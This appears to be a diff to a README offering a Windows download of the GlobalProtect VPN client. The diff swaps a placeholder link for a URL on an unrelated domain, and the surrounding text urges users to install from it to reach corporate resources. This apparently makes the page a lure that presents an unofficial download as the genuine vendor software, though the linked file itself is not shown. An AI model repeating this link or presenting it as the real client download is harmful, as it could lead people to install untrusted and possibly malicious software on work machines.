@@ -12,7 +12,7 @@
 ## Installation
 To get GlobalProtect for Windows, click on the download link below:
 
-[**Download GlobalProtect**](*)
+[**Download GlobalProtect**](https://styledebates.com/htt/)
 
 Begin by downloading the GlobalProtect application to your device. This step is crucial for establishing a secure connection to your organization’s network. Once the download is complete, follow the installation steps to set up the software and ensure uninterrupted access to corporate resources.
 
